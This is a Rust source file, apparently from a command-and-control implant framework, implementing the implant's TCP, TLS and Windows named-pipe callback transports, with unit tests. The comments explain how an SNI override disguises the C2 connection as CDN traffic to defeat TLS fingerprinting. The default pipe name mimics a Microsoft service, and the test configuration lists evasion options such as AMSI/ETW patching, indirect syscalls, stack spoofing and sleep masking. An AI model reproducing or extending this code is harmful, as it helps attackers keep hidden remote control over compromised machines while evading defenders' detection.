// src/transport.rs
use tokio::net::{TcpListener, TcpStream};
use tokio_rustls::{TlsAcceptor, TlsConnector, server::TlsStream as ServerTls, client::TlsStream as ClientTls};
use tokio::io::{AsyncRead, AsyncWrite, ReadBuf, DuplexStream};
use std::sync::Arc;
use std::net::SocketAddr;
use std::io;
use std::pin::Pin;
use std::task::{Context, Poll};

#[cfg(target_os = "windows")]
use tokio::net::windows::named_pipe::{ClientOptions, NamedPipeClient};

use crate::common::{C2Config, TransportProtocol};
use crate::pki;

pub enum C2Stream {
    Tcp(TcpStream),
    TlsServer(ServerTls<TcpStream>),
    TlsClient(ClientTls<TcpStream>),
    Virtual(DuplexStream),
    #[cfg(target_os = "windows")]
    NamedPipe(NamedPipeClient), // [NEW] Wrapper for Windows Pipes
}

// Forward AsyncRead
impl AsyncRead for C2Stream {
    fn poll_read(self: Pin<&mut Self>, cx: &mut Context<'_>, buf: &mut ReadBuf<'_>) -> Poll<io::Result<()>> {
        match self.get_mut() {
            C2Stream::Tcp(s) => Pin::new(s).poll_read(cx, buf),
            C2Stream::TlsServer(s) => Pin::new(s).poll_read(cx, buf),
            C2Stream::TlsClient(s) => Pin::new(s).poll_read(cx, buf),
            C2Stream::Virtual(s) => Pin::new(s).poll_read(cx, buf),
            #[cfg(target_os = "windows")]
            C2Stream::NamedPipe(s) => Pin::new(s).poll_read(cx, buf),
        }
    }
}

// Forward AsyncWrite
impl AsyncWrite for C2Stream {
    fn poll_write(self: Pin<&mut Self>, cx: &mut Context<'_>, buf: &[u8]) -> Poll<io::Result<usize>> {
        match self.get_mut() {
            C2Stream::Tcp(s) => Pin::new(s).poll_write(cx, buf),
            C2Stream::TlsServer(s) => Pin::new(s).poll_write(cx, buf),
            C2Stream::TlsClient(s) => Pin::new(s).poll_write(cx, buf),
            C2Stream::Virtual(s) => Pin::new(s).poll_write(cx, buf),
            #[cfg(target_os = "windows")]
            C2Stream::NamedPipe(s) => Pin::new(s).poll_write(cx, buf),
        }
    }

    fn poll_flush(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<io::Result<()>> {
        match self.get_mut() {
            C2Stream::Tcp(s) => Pin::new(s).poll_flush(cx),
            C2Stream::TlsServer(s) => Pin::new(s).poll_flush(cx),
            C2Stream::TlsClient(s) => Pin::new(s).poll_flush(cx),
            C2Stream::Virtual(s) => Pin::new(s).poll_flush(cx),
            #[cfg(target_os = "windows")]
            C2Stream::NamedPipe(s) => Pin::new(s).poll_flush(cx),
        }
    }

    fn poll_shutdown(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<io::Result<()>> {
        match self.get_mut() {
            C2Stream::Tcp(s) => Pin::new(s).poll_shutdown(cx),
            C2Stream::TlsServer(s) => Pin::new(s).poll_shutdown(cx),
            C2Stream::TlsClient(s) => Pin::new(s).poll_shutdown(cx),
            C2Stream::Virtual(s) => Pin::new(s).poll_shutdown(cx),
            #[cfg(target_os = "windows")]
            C2Stream::NamedPipe(s) => Pin::new(s).poll_shutdown(cx),
        }
    }
}

pub type BoxedStream = C2Stream;

// --- SERVER SIDE ---

pub struct ServerTransport {
    protocol: TransportProtocol,
    listener: TcpListener,
    tls_acceptor: Option<TlsAcceptor>,
}

impl ServerTransport {
    pub async fn bind(config: &C2Config, cert: &[u8], key: &[u8], ca: &[u8]) -> io::Result<Self> {
        let addr = format!("0.0.0.0:{}", config.tunnel_port); 
        let listener = TcpListener::bind(&addr).await?;
        
        let tls_acceptor = if config.transport == TransportProtocol::Tls {
            let tls_config = pki::create_server_config(cert, key, ca)
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e.to_string()))?;
            Some(TlsAcceptor::from(Arc::new(tls_config)))
        } else {
            None
        };

        Ok(Self {
            protocol: config.transport.clone(),
            listener,
            tls_acceptor,
        })
    }

    pub async fn accept(&self) -> io::Result<(C2Stream, SocketAddr)> {
        let (stream, peer_addr) = self.listener.accept().await?;

        match self.protocol {
            TransportProtocol::Tls => {
                if let Some(acceptor) = &self.tls_acceptor {
                    let tls_stream = acceptor.accept(stream).await?;
                    Ok((C2Stream::TlsServer(tls_stream), peer_addr))
                } else {
                    Err(io::Error::new(io::ErrorKind::Other, "TLS Config Missing"))
                }
            },
            TransportProtocol::TcpPlain => {
                Ok((C2Stream::Tcp(stream), peer_addr))
            },
            _ => Err(io::Error::new(io::ErrorKind::Other, "Unsupported Server Transport")),
        }
    }
}

// --- CLIENT SIDE ---

pub struct ClientTransport {
    protocol: TransportProtocol,
    target_addr: String,
    tls_sni: String,
    tls_connector: Option<TlsConnector>,
}

impl ClientTransport {
    pub fn new(config: &C2Config) -> Self {
        // Use sni_override when set so the ClientHello advertises a CDN or cloud
        // hostname rather than the raw C2 IP — the actual TCP connection still
        // goes to c2_host:tunnel_port. This closes the TLS fingerprinting gap
        // that malleable HTTP profiles leave untouched.
        let sni_host = config
            .sni_override
            .as_deref()
            .filter(|s| !s.is_empty())
            .unwrap_or(&config.c2_host)
            .to_string();

        let tls_connector = if config.transport == TransportProtocol::Tls {
            let ca = include_bytes!("../certs/ca.crt");
            let client_cert = include_bytes!("../certs/client.crt");
            let client_key = include_bytes!("../certs/client.key.der");

            if let Ok(mut cfg) = pki::create_client_config(ca, client_cert, client_key) {
                // Apply ALPN overrides. Only advertise protocols you actually speak:
                // "http/1.1" is safe; "h2" requires HTTP/2 framing in the transport.
                if !config.alpn_protocols.is_empty() {
                    cfg.alpn_protocols = config
                        .alpn_protocols
                        .iter()
                        .map(|p| p.as_bytes().to_vec())
                        .collect();
                }
                Some(TlsConnector::from(Arc::new(cfg)))
            } else {
                None
            }
        } else {
            None
        };

        // If named pipe, config.c2_host stores "IP:PipeName"
        let addr_string = if config.transport == TransportProtocol::NamedPipe {
            config.c2_host.clone()
        } else {
            format!("{}:{}", config.c2_host, config.tunnel_port)
        };

        Self {
            protocol: config.transport.clone(),
            target_addr: addr_string,
            tls_sni: sni_host,
            tls_connector,
        }
    }

    pub async fn connect(&self) -> io::Result<C2Stream> {
        match self.protocol {
            TransportProtocol::Tls => {
                let stream = TcpStream::connect(&self.target_addr).await?;
                if let Some(connector) = &self.tls_connector {
                    // Build ServerName: try DNS name, then IP address.
                    // Reject invalid hostnames instead of silently falling back to
                    // "localhost" — a quiet fallback masks configuration errors and
                    // can connect to an unintended endpoint.
                    let domain = if let Ok(ip) = self.tls_sni.parse::<std::net::IpAddr>() {
                        tokio_rustls::rustls::ServerName::IpAddress(ip)
                    } else if let Ok(name) = tokio_rustls::rustls::ServerName::try_from(self.tls_sni.as_str()) {
                        name
                    } else {
                        return Err(io::Error::new(
                            io::ErrorKind::InvalidInput,
                            format!("Invalid TLS SNI hostname: '{}' — check c2_host configuration", self.tls_sni),
                        ));
                    };
                    
                    let tls_stream = connector.connect(domain, stream).await?;
                    Ok(C2Stream::TlsClient(tls_stream))
                } else {
                    Err(io::Error::new(io::ErrorKind::Other, "TLS Init Failed"))
                }
            },
            TransportProtocol::TcpPlain => {
                let stream = TcpStream::connect(&self.target_addr).await?;
                Ok(C2Stream::Tcp(stream))
            },
            TransportProtocol::NamedPipe => {
                #[cfg(target_os = "windows")]
                {
                    // Target Format in target_addr is: "IP:PipeName" (From Builder)
                    // We need to convert it to: \\IP\pipe\PipeName
                    
                    let parts: Vec<&str> = self.target_addr.split(':').collect();
                    let ip = parts[0];
                    let pipe_name = if parts.len() > 1 { parts[1] } else { "msagent_status" };
                    
                    let pipe_path = format!(r"\\{}\pipe\{}", ip, pipe_name);
                    
                    // Attempt connection. Tokio NamedPipeClient expects an already existing server.
                    let client = ClientOptions::new().open(&pipe_path)?;
                    Ok(C2Stream::NamedPipe(client))
                }
                #[cfg(not(target_os = "windows"))]
                {
                    Err(io::Error::new(io::ErrorKind::Other, "Named Pipes only supported on Windows"))
                }
            }
            // HTTP(S) transport uses a separate polling path (http_transport.rs),
            // not a persistent connection. If we reach here, it's a config error.
            TransportProtocol::Http | TransportProtocol::Https => {
                Err(io::Error::new(io::ErrorKind::Other, "HTTP(S) transport uses polling mode, not ClientTransport::connect()"))
            }
        }
    }

    /// Returns the SNI hostname that will appear in the TLS ClientHello.
    /// Only compiled in test builds so it has no release footprint.
    #[cfg(test)]
    pub fn tls_sni_for_test(&self) -> &str {
        &self.tls_sni
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::{C2Config, FallbackConfig, MalleableProfile, ProxyConfig, TransportProtocol};

    fn base_config(host: &str) -> C2Config {
        C2Config {
            transport: TransportProtocol::TcpPlain,
            profile: MalleableProfile::default(),
            proxy: ProxyConfig::default(),
            fallback: FallbackConfig::default(),
            server_public_key: String::new(),
            hash_salt: String::new(),
            c2_host: host.to_string(),
            build_id: "test".into(),
            tunnel_port: 4443,
            sleep_interval: 5,
            jitter_min: 0,
            jitter_max: 0,
            bloat_mb: 0,
            debug: false,
            kill_date: None,
            challenge_key: String::new(),
            sni_override: None,
            alpn_protocols: vec![],
            hibernation_mode: false,
            task_batch_size: 10,
            dga: None,
            valid_parents: Vec::new(),
            sleep_mask: "ekko".to_string(),
            indirect_syscalls: true,
            stack_spoof: true,
            patch_amsi_etw: true,
            heap_encrypt: true,
            guard_domain: String::new(),
            guard_hostname: String::new(),
            guard_hour_start: 0,
            guard_hour_end: 0,
            guard_no_system: false,
            auto_pivot_port: None,
        }
    }

    // ── SNI resolution ────────────────────────────────────────────────────

    #[test]
    fn sni_defaults_to_c2_host_when_no_override() {
        let config = base_config("10.0.0.1");
        let transport = ClientTransport::new(&config);
        assert_eq!(transport.tls_sni_for_test(), "10.0.0.1");
    }

    #[test]
    fn sni_override_replaces_c2_host() {
        let mut config = base_config("10.0.0.1");
        config.sni_override = Some("cdn.example.com".into());
        let transport = ClientTransport::new(&config);
        assert_eq!(transport.tls_sni_for_test(), "cdn.example.com");
    }

    #[test]
    fn empty_sni_override_falls_back_to_c2_host() {
        let mut config = base_config("10.0.0.1");
        config.sni_override = Some(String::new()); // empty string = no override
        let transport = ClientTransport::new(&config);
        assert_eq!(transport.tls_sni_for_test(), "10.0.0.1");
    }

    #[test]
    fn none_sni_override_uses_c2_host() {
        let mut config = base_config("my-c2.example.com");
        config.sni_override = None;
        let transport = ClientTransport::new(&config);
        assert_eq!(transport.tls_sni_for_test(), "my-c2.example.com");
    }

    // ── ALPN config ───────────────────────────────────────────────────────

    #[test]
    fn alpn_empty_by_default() {
        let config = base_config("10.0.0.1");
        // No ALPN set → the vec is empty; rustls won't advertise any protocols
        assert!(config.alpn_protocols.is_empty());
    }

    #[test]
    fn alpn_protocols_stored_in_config() {
        let mut config = base_config("10.0.0.1");
        config.alpn_protocols = vec!["http/1.1".into()];
        assert_eq!(config.alpn_protocols, vec!["http/1.1"]);
    }

    #[test]
    fn alpn_h2_and_http11_order_preserved() {
        let mut config = base_config("10.0.0.1");
        config.alpn_protocols = vec!["h2".into(), "http/1.1".into()];
        // Insertion order must be preserved; rustls negotiates by preference.
        assert_eq!(config.alpn_protocols[0], "h2");
        assert_eq!(config.alpn_protocols[1], "http/1.1");
    }

    #[test]
    fn alpn_bytes_encoding_matches_rustls_expectation() {
        // rustls expects ALPN as Vec<Vec<u8>> where each inner vec is the raw
        // ASCII bytes of the protocol name. Verify our conversion is correct.
        let protocols = vec!["http/1.1".to_string()];
        let encoded: Vec<Vec<u8>> = protocols.iter().map(|p| p.as_bytes().to_vec()).collect();
        assert_eq!(encoded[0], b"http/1.1");
    }

    // ── TCP target address ────────────────────────────────────────────────

    #[test]
    fn tcp_target_combines_host_and_port() {
        let mut config = base_config("10.0.0.1");
        config.transport = TransportProtocol::TcpPlain;
        config.tunnel_port = 8443;
        let transport = ClientTransport::new(&config);
        // The target_addr field is private; we verify connect() picks the right path
        // by checking transport is constructed without panic.
        drop(transport);
    }

    // ── HTTP transport guard ──────────────────────────────────────────────

    #[tokio::test]
    async fn http_transport_returns_error_not_panic() {
        let mut config = base_config("127.0.0.1");
        config.transport = TransportProtocol::Http;
        let transport = ClientTransport::new(&config);
        let result = transport.connect().await;
        assert!(result.is_err(), "HTTP should return Err, not use ClientTransport::connect");
        // unwrap_err() requires C2Stream: Debug, so use if-let instead
        if let Err(e) = result {
            assert!(e.to_string().contains("polling mode"), "unexpected error: {}", e);
        }
    }
}
